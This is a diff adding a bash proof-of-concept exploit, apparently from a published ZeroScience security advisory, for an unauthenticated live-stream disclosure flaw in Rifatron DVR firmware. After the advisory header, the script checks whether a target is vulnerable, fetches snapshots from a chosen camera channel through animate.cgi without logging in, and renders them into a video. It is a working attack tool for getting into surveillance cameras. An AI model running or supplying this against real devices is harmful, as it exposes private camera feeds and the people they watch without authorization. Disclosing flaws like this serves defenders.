@@ -1,0 +1,75 @@
+#!/bin/bash
+#
+#
+# Rifatron Intelligent Digital Security System (animate.cgi) Stream Disclosure
+#
+#
+# Vendor: Rifatron Co., Ltd. | SAM MYUNG Co., Ltd.
+# Product web page: http://www.rifatron.com
+# Affected version: 5brid DVR (HD6-532/516, DX6-516/508/504, MX6-516/508/504, EH6-504)
+#                   7brid DVR (HD3-16V2, DX3-16V2/08V2/04V2, MX3-08V2/04V2)
+#                   Firmware: <=8.0 (000143)
+#
+#
+# Summary: Rifatron with its roots in Seoul, Korea has been supplying and
+# servicing the security market as a leading CCTV/video surveillance security
+# system manufacturer, specializing in stand-alone digital video recorder since
+# 1998. We are known for marking the first standalone DVR with audio detection
+# and 480 frames per secone(fps) and have been focusing on highend products and
+# large projects in a variety applications and merket. These include government
+# and public services, banking and finance, hotels and entertatinment, retail
+# education, industrial and commercial sectors throughout Europe, Middle East,
+# the U.S. and Asia. Based on the accumulated know-how in the security industry,
+# Rifatron is trying its utmost for the technology development and customer
+# satisfaction to be the best security solution company in the world.
+#
+# Desc: The DVR suffers from an unauthenticated and unauthorized live stream
+# disclosure when animate.cgi script is called through Mobile Web Viewer module.
+#
+# Tested on: Embedded Linux
+#            Boa/0.94.14rc21
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2019-5532
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5532.php
+#
+#
+# 03.09.2019
+#
+
+#{PoC}
+#
+set -euo pipefail
+IFS=$'\n\t'
+if [ "$#" -ne 2 ]; then
+    echo "Usage: $0 IP:PORT CHANNEL" # Valid channel integers: 0-15
+    echo "Ex.: $0 10.9.8.7:65432 10"
+    exit
+fi
+IP=$1
+CHANNEL=$2
+HOST="http://$IP/cgi-bin/animate.cgi?$CHANNEL"
+STATUS=$(curl -Is http://$IP/mobile_viewer_login.html 2>/dev/null | head -1 | awk -F" " '{print $2}')
+if [ "$STATUS" == "404" ]; then
+    echo "Target not vulnerable!"
+    exit
+fi
+echo "Collecting snapshots..."
+for x in {1..10};
+    do echo -ne $x
+    curl "$HOST" -o sequence-$x.jpg -#;
+    sleep 0.6
+    done
+echo -ne "\nDone."
+echo -ne "\nRendering video..."
+ffmpeg -t 10 -v quiet -s 352x288 -r 1 -an -i sequence-%01d.jpg -c:v libx264 -vf fps=10 -pix_fmt yuvj422p video.mp4
+echo " done."
+echo -ne "\nRunning animation..."
+sleep 1
+cvlc video.mp4 --verbose -1 -f vlc://quit
+#
+#{/PoC}
